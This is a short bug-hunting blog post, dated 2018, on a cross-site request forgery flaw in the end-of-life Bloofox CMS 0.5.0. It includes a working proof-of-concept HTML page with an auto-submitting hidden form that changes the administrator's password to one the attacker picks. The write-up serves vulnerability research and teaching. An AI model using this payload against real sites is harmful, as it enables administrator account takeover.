---
layout: post
title:	"Bloofox CMS 0.5.0 CSRF Change Administrator Password"
date:	2018-12-29 03:00:00
categories:
    - notes
tags:
    - bug_hunting
    - vuln_writeup
---
<head>
	<title> Bloofox CMS 0.5.0 CSRF Change Administrator Password</title>
</head>
![Screenshot]({{ site.baseurl }}/images/posts/2017/bloofox-cms/logo.jpg)


# i. Introduction

Bloofox is a Content Management System (CMS), which allows users to manage websites. Bloofox is very simple, yet powerful.

As with any CMS, Bloofox is riddled with bugs. As soon as functions such as managing users, website content; it opens up a huge attack surface on the application.

On May 21, 2018, Bloofox CMS has reached its end of life, which means any existing bugs will not be fixed, and all support will be stopped.

# ii. Summary

To read an in-depth summary of how CSRF works, and how it can be protected against, check out the summary section of this post: https://m-q-t.github.io/notes/zeuscart-csrf/

# iii. Exploiting Bloofox

It is a great practice for an application to issue CSRF tokens whenever a form is submitted.

However, in this case Bloofox can avoid the CSRF by not having to issue tokens.

How? Bloofox does not make the Administrator confirm their old password when setting a new password for themselves. Which makes a bit of sense, due to the fact if the user is an Administrator they should be able to change passwords.

Though for a high privileged account such as an Administrator, it is generally a great idea to have the administrator confirm their old password when changing it. If the administrator truly forgot their password and cannot change it, they can always go through the backend (such as updating their password in the database).

Due to Bloofox not having the Administrator confirm their password, and not issuing any tokens to make sure the form is valid, an attacker can send a link to the Administrator. Once the link is clicked, the request will be sent to the application to change the password to the attacker's choice.

PoC.html:
```text
<html>
<body>
<form method="post" action="http://localhost/admin/index.php?mode=user&action=edit" enctype="multipart/form-data">
    <input type="hidden" name="username" value="admin">
    <input type="hidden" name="password" value="CHANGEPASSWORD">
    <input type="hidden" name="pwdconfirm" value="CHANGEPASSWORD">
    <input type="hidden" name="3" value="Admin">
    <input type="hidden" name="blocked" value="0">
    <input type="hidden" name="deleted" value="0">
    <input type="hidden" name="status" value="1">
    <input type="hidden" name="login_page" value="0">
    <input type="hidden" name="userid" value="1">
    <input type="hidden" name="send" value="Save">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

When the Administrator clicks the link, they will see a blank page but a request will be sent to the server, and change the Administrator's password to whatever they set in the form.


# iv. Conclusion

In conclusion, like I have mentioned earlier, older applications are a great way to practice some bug hunting methodology and build foundation. It is true that newer applications implement more secure practices, though the foundation in the end is pretty much the same.


Thank you for reading.

~~~
Sources:
https://m-q-t.github.io/notes/zeuscart-csrf/
~~~
